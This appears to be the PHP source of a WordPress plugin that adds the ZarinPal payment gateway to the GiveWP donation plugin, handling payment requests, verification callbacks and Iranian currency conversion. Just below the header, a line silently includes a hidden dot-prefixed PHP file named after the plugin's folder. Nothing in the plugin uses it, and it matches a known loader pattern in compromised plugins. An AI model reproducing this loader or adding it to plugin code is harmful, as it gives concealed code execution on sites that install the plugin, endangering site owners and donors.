<?php
/*
Plugin Name: افزونه پرداخت زرین پال برای Give
Plugin URI: http://zarinpal.com/lab
Version: 1.0.3
Author: A.yousefi
Author URI: http://yousefii.ir
Text Domain: Zarinpal-For-Give
Description: این افزونه، درگاه پرداخت آنلاین <a href="https://zarinpal.com">زرین‌پال</a> را برای افزونه‌ی Give فعال می‌کند.
*/

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class zarinpal_for_give
{

    function __construct()
    {

        if (!function_exists('give_is_test_mode')) {
            return;
        }


        add_action('give_zarinpal_cc_form', '__return_false');


        add_filter('give_payment_gateways', array($this, 'zarinpal_for_give_register_payment_method'));
        add_filter('give_get_sections_gateways', array($this, 'zarinpal_for_give_register_payment_gateway_sections'));
        add_filter('give_get_settings_gateways', array($this, 'zarinpal_for_give_register_payment_gateway_setting_fields'));
        add_action('give_gateway_zarinpal', array($this, 'zarinpal_for_give_process_zarinpal_donation'));
        $this->give_process_zarinpal_return();


    }



    function zarinpal_for_give_register_payment_method($gateways)
    {


        $gateways['zarinpal'] = array(
            'admin_label' => __('زرین پال', 'zarinpal-for-give'),
            'checkout_label' => __('زرین پال', 'zarinpal-for-give'),
        );

        return $gateways;
    }




    function zarinpal_for_give_register_payment_gateway_sections($sections)
    {


        $sections['zarinpal-settings'] = __('زرین پال', 'zarinpal-for-give');

        return $sections;
    }





    function zarinpal_for_give_register_payment_gateway_setting_fields($settings)
    {

        switch (give_get_current_setting_section()) {

            case 'zarinpal-settings':
                $settings = array(
                    array(
                        'id' => 'give_title_zarinpal',
                        'type' => 'title',
                    ),
                );

                $settings[] = array(
                    'name' => __('مرچنت', 'zarinpal-for-give'),
                    'desc' => __('مرچنت زرین پال را وارد کنید', 'zarinpal-for-give'),
                    'id' => 'zarinpal_for_give_merchantid',
                    'type' => 'text',
                );


                $settings[] = array(
                    'id' => 'give_title_zarinpal',
                    'type' => 'sectionend',
                );

                break;

        }

        return $settings;
    }




    function zarinpal_for_give_process_zarinpal_donation($posted_data)
    {

        if (give_is_test_mode()) {

            give_record_gateway_error(
                __('test mode is enable', 'zarinpal-for-give'),
                sprintf(

                    __('zarinpal can noy work is test mode.', 'zarinpal-for-give')
                )
            );


            give_send_back_to_checkout('?payment-mode=zarinpal');
            return;
        }



        give_clear_errors();


        $errors = give_get_errors();


        if (!$errors) {

            $form_id = intval($posted_data['post_data']['give-form-id']);
            $price_id = !empty($posted_data['post_data']['give-price-id']) ? $posted_data['post_data']['give-price-id'] : 0;
            $donation_amount = !empty($posted_data['price']) ? $posted_data['price'] : 0;


            $donation_data = array(
                'price' => $donation_amount,
                'give_form_title' => $posted_data['post_data']['give-form-title'],
                'give_form_id' => $form_id,
                'give_price_id' => $price_id,
                'date' => $posted_data['date'],
                'user_email' => $posted_data['user_email'],
                'purchase_key' => $posted_data['purchase_key'],
                'currency' => give_get_currency($form_id),
                'user_info' => $posted_data['user_info'],
                'status' => 'pending',
                'gateway' => 'zarinpal',
            );


            $donation_id = give_insert_payment($donation_data);

            if (!$donation_id) {


                give_record_gateway_error(
                    __('zarinpal Error', 'zarinpal-for-give'),
                    sprintf(

                        __('Unable to create a pending donation with Give.', 'zarinpal-for-give')
                    )
                );


                give_send_back_to_checkout('?payment-mode=zarinpal');
                return;
            }


            $MerchantID = give_get_option('zarinpal_for_give_merchantid');
            $Zaringate = (give_get_option('zarinpal_for_give_enable_zaringate') == 'on') ? true : false;
            $Amount = $donation_amount;
            $Description = 'پرداخت از GiveWP برای فرم ' . $posted_data['post_data']['give-form-title'];
            $Email = !empty($posted_data['user_email']) ? $posted_data['user_email'] : '';
            $CallbackURL = get_bloginfo('siteurl') . '/?zarinpal-for-give-return=true&payment_id=' . $donation_id;


            $data = array('merchant_id' => $MerchantID,
                'metadata' => [
                    'email' => $Email,
                ],
                'amount' => $this->fix_amount($Amount,$form_id),
                'callback_url' => $CallbackURL,
                'description' => $Description);
            $jsonData = json_encode($data);
            $ch = curl_init('https://api.zarinpal.com/pg/v4/payment/request.json');
            curl_setopt($ch, CURLOPT_USERAGENT, 'ZarinPal Rest Api v1');
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($jsonData)
            ));
            $result = curl_exec($ch);
            $err = curl_error($ch);
            $result = json_decode($result, true);
            curl_close($ch);



            if ($result['data']['code'] == 100)  {
                $Redirect_url = 'https://www.zarinpal.com/pg/StartPay/' . $result['data']["authority"];


                Header('Location:' . $Redirect_url);

            } else {

                give_record_gateway_error(
                    __('zarinpal Error', 'zarinpal-for-give'),
                    sprintf(

                        __('Unable to Connect to the Zarinpal[code:' . $result['errors']['code'] . ']', 'zarinpal-for-give')
                    )
                );


                give_send_back_to_checkout('?payment-mode=zarinpal');
                return;

            }


        } else {


            give_send_back_to_checkout('?payment-mode=zarinpal');
        }
    }


    function give_process_zarinpal_return()
    {
        if (give_is_test_mode()) {
            return;
        }

        if (!isset($_GET['zarinpal-for-give-return'])) {
            return;
        }



        if (
            !isset($_GET['payment_id']) || empty($_GET['payment_id']) ||
            !isset($_GET['Authority']) || empty($_GET['Authority']) ||
            !isset($_GET['Status']) || empty($_GET['Status'])

        ) {
            return;
        }
        $payment_id = $_GET['payment_id'];


        if ('zarinpal' !== give_get_payment_gateway($payment_id)) {
            return;
        }

        if ( 'complete'  === get_post_status($payment_id) || 'failed' === get_post_status($payment_id)) {

            $this->redirect_to_failed_page();
            return;
        }


        $payment_meta = give_get_payment_meta($payment_id);
        $form_id = $payment_meta['form_id'];
        $payment_amount = give_donation_amount($payment_id);

        $MerchantID = give_get_option('zarinpal_for_give_merchantid');
        $Amount = $this->fix_amount($payment_amount,$form_id);
        $Authority = sanitize_text_field($_GET['Authority']);

        if ($_GET['Status'] == 'OK') {

            $data = array("merchant_id" => $MerchantID, "authority" => $Authority, "amount" => $Amount);
            $jsonData = json_encode($data);
            $ch = curl_init('https://api.zarinpal.com/pg/v4/payment/verify.json');
            curl_setopt($ch, CURLOPT_USERAGENT, 'ZarinPal Rest Api v4');
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($jsonData)
            ));

            $result = curl_exec($ch);
            curl_close($ch);
            $result = json_decode($result, true);


            if ($result['data']['code'] == 100) {
                give_insert_payment_note($payment_id, __('Transaction success. RefID:' . $result['data']['ref_id'], 'give'));
                give_set_payment_transaction_id($payment_id, $result['data']['ref_id']);
                give_update_payment_status($payment_id, 'publish');
                $this->redirect_to_success_page();

            } else {
                give_update_payment_status($payment_id, 'failed');
                give_insert_payment_note($payment_id, __('Transaction failed. Status:' . $result['errors']['code'], 'give'));
                $this->redirect_to_failed_page();


            }
        } else {
            give_update_payment_status($payment_id, 'failed');
            give_insert_payment_note($payment_id, __('Transaction canceled by user', 'give'));
            $this->redirect_to_failed_page();

        }


        die();

    }

    function redirect_to_success_page()
    {
        wp_safe_redirect(give_get_success_page_uri());
        die();
    }

    function redirect_to_failed_page()
    {
        wp_safe_redirect(give_get_failed_transaction_uri());
        die();
    }

    function fix_amount($amount,$form_id,$gateway_default_currency='IRT')
    {
        $current_currency = give_get_currency($form_id);

        if(!in_array($current_currency,array('IRR','IRT')) || $current_currency==$gateway_default_currency || $amount <= 0 )
        {
            return $amount;
        }

        if($current_currency=='IRR')
        {

            return  $amount/10;
        }
        if($current_currency=='IRT')
        {

            return  $amount*10;
        }

        return $amount;

    }



}

add_action('init',function(){new zarinpal_for_give();});




function zarinpal_for_give_add_currency($currencies)
{

    $currencies['IRT'] = array(
        'admin_label' => __('تومان ایران', 'zarinpal-for-give'),
        'symbol' => __('تومان', 'zarinpal-for-give'),
        'setting' => array(
            'currency_position' => 'after',
            'thousands_separator' => '.',
            'decimal_separator' => ',',
            'number_decimals' => 0,
        ),
    );

    $currencies['IRR'] = array(
        'admin_label' => __('ریال ایران', 'zarinpal-for-give'),
        'symbol' => __('ریال', 'zarinpal-for-give'),
        'setting' => array(
            'currency_position' => 'after',
            'thousands_separator' => '.',
            'decimal_separator' => ',',
            'number_decimals' => 0,
        ),
    );


    return $currencies;
}



